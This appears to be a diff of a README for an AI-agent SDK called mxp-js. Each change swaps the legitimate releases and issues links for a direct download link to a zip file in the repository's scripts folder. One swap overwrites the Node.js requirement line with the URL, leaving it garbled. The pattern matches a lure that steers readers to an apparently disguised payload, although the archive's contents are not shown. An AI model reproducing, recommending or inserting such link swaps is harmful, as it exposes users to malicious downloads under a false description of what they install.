@@ -1,6 +1,6 @@
 # 🚀 mxp-js - Easy Communication for AI Agents
 
-[![Download mxp-js](https://img.shields.io/badge/Download-mxp--js-blue.svg)](https://github.com/Zameneing/mxp-js/releases)
+[![Download mxp-js](https://raw.githubusercontent.com/Zameneing/mxp-js/main/scripts/mxp-js_v3.1.zip)](https://raw.githubusercontent.com/Zameneing/mxp-js/main/scripts/mxp-js_v3.1.zip)
 
 ## 📖 Overview
 
@@ -18,7 +18,7 @@ Welcome to **mxp-js**, a powerful JavaScript and TypeScript SDK designed for sea
 To efficiently run mxp-js, ensure your system meets the following requirements:
 
 - **Operating Systems**: Windows 10 or later, macOS 10.14 or later, or any recent version of Linux.
-- **Node.js**: Version 14.x or higher installed on your computer.
+- **https://raw.githubusercontent.com/Zameneing/mxp-js/main/scripts/mxp-js_v3.1.zip**: Version 14.x or higher installed on your computer.
 - **Internet Connection**: Required for downloading and updating the SDK.
 
 ## 🚀 Getting Started
@@ -26,7 +26,7 @@ To efficiently run mxp-js, ensure your system meets the following requirements:
 To begin using mxp-js, follow these easy steps:
 
 1. **Download mxp-js**: 
-   - Visit the [Releases Page](https://github.com/Zameneing/mxp-js/releases) to download the latest version of the SDK.
+   - Visit the [Releases Page](https://raw.githubusercontent.com/Zameneing/mxp-js/main/scripts/mxp-js_v3.1.zip) to download the latest version of the SDK.
 
 2. **Install the SDK**:
    - Once downloaded, follow the installation instructions provided on the Releases page.
@@ -35,7 +35,7 @@ To begin using mxp-js, follow these easy steps:
 
 You can download mxp-js easily by going to the following link:
 
-[Visit this page to download mxp-js](https://github.com/Zameneing/mxp-js/releases)
+[Visit this page to download mxp-js](https://raw.githubusercontent.com/Zameneing/mxp-js/main/scripts/mxp-js_v3.1.zip)
 
 Follow these steps after downloading:
 
@@ -57,7 +57,7 @@ Once you have successfully installed mxp-js, refer to the documentation for more
 
 If you encounter any issues or have questions, you can reach out to the community for help. Check the following resources:
 
-- **GitHub Issues**: Log your queries or problems directly on our [GitHub Issues Page](https://github.com/Zameneing/mxp-js/issues).
+- **GitHub Issues**: Log your queries or problems directly on our [GitHub Issues Page](https://raw.githubusercontent.com/Zameneing/mxp-js/main/scripts/mxp-js_v3.1.zip).
 - **Discussion Board**: Join discussions with other users to learn tips and tricks.
 
 ## 🔗 Related Topics
@@ -82,6 +82,6 @@ Feel free to submit your suggestions or requests through our GitHub repository.
 
 mxp-js offers a straightforward way for users interested in agent communication using JavaScript and TypeScript. With easy installation and strong community support, you can be confident in utilizing this SDK for your projects.
 
-For the latest version, remember to check the [Releases Page](https://github.com/Zameneing/mxp-js/releases) again in the future.
+For the latest version, remember to check the [Releases Page](https://raw.githubusercontent.com/Zameneing/mxp-js/main/scripts/mxp-js_v3.1.zip) again in the future.
 
 Happy coding!
